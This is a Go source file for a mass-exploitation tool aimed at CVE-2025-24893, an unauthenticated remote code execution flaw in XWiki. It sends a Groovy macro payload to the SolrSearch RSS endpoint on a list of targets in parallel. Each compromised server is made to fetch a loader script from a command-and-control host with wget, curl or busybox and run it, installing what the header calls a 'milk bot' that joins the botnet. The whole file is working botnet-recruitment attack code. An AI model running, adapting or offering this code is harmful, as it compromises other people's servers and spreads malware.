// CVE-2025-24893 — XWiki unauth RCE via the SolrSearch RSS endpoint and the
// {{groovy}}/{{async}} macro. Drives the CNC loader so the target downloads and
// runs the milk bot (tag "xwiki"), which then registers on the CNC.
//
// Build: GO111MODULE=off go build -o xwiki main.go
// Run:   ./xwiki -url http://host:8080
//
//	./xwiki -file targets.txt -w 20
package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"
)

const cncIP = "1.1.1.1"

func randStr(n int) string {
	const a = "abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, n)
	for i := range b {
		b[i] = a[rand.Intn(len(a))]
	}
	return string(b)
}

func loader(tag string) string {
	f := "/tmp/." + randStr(8)
	return fmt.Sprintf("(wget -qO %s http://%s/l_%s.sh||curl -so %s http://%s/l_%s.sh"+
		"||busybox wget -qO %s http://%s/l_%s.sh); sh %s %s",
		f, cncIP, tag, f, cncIP, tag, f, cncIP, tag, f, tag)
}

var client = &http.Client{
	Timeout: 15 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
}

// fire sends the groovy payload to one XWiki base URL. Returns true if the
// server answered 200/500 (macro context reached).
func fire(base, tag string) bool {
	u, err := url.Parse(base)
	if err != nil {
		return false
	}
	payload := fmt.Sprintf("{{async async=true cache=false}}{{groovy}}"+
		"['bash','-c','%s'].execute(){{/groovy}}{{/async}}", loader(tag))
	for _, p := range []string{
		"/xwiki/bin/get/Main/SolrSearch?media=rss&text=",
		"/bin/get/Main/SolrSearch?media=rss&text=",
	} {
		target := u.Scheme + "://" + u.Host + p + url.QueryEscape(payload)
		req, _ := http.NewRequest("GET", target, nil)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, io.LimitReader(resp.Body, 2048))
		resp.Body.Close()
		if resp.StatusCode == 200 || resp.StatusCode == 500 {
			return true
		}
	}
	return false
}

func main() {
	one := flag.String("url", "", "single target base URL")
	file := flag.String("file", "", "file of base URLs (one per line)")
	workers := flag.Int("w", 10, "parallel workers")
	tag := flag.String("tag", "xwiki", "CNC arch tag")
	flag.Parse()

	var targets []string
	if *one != "" {
		targets = append(targets, *one)
	}
	if *file != "" {
		f, err := os.Open(*file)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		s := bufio.NewScanner(f)
		for s.Scan() {
			if t := s.Text(); t != "" {
				targets = append(targets, t)
			}
		}
		f.Close()
	}
	if len(targets) == 0 {
		fmt.Fprintln(os.Stderr, "usage: xwiki -url http://host:8080 | -file targets.txt")
		os.Exit(1)
	}

	var wg sync.WaitGroup
	sem := make(chan struct{}, *workers)
	var mu sync.Mutex
	hits := 0
	for _, t := range targets {
		wg.Add(1)
		sem <- struct{}{}
		go func(t string) {
			defer wg.Done()
			defer func() { <-sem }()
			if fire(t, *tag) {
				mu.Lock()
				hits++
				mu.Unlock()
				fmt.Printf("[HIT] %s\n", t)
			}
		}(t)
	}
	wg.Wait()
	fmt.Printf("xwiki done hits=%d / %d\n", hits, len(targets))
}
